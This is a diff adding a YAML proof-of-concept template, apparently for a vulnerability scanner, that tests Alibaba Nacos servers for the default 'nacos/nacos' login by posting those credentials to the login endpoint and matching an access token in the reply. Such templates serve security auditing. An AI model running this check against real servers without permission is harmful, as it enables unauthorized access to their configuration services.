@@ -1,0 +1,22 @@
+id: poc-yaml-alibaba-nacos-weak-pass
+info:
+  name: Alibaba Nacos 弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: Alibaba
+  osprey-id: vb_2022_0122
+requests:
+- method: POST
+  path: /nacos/v1/auth/users/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=nacos&password=nacos
+  expression: 'status_code == 200 && contains(body, "\"accessToken\":") &&
+
+    (contains(body, "\"username\":") || contains(body, "\"globalAdmin\":") )   &&
+    !contains(body, "</")
+
+    '
+variables: {}
+transport: http
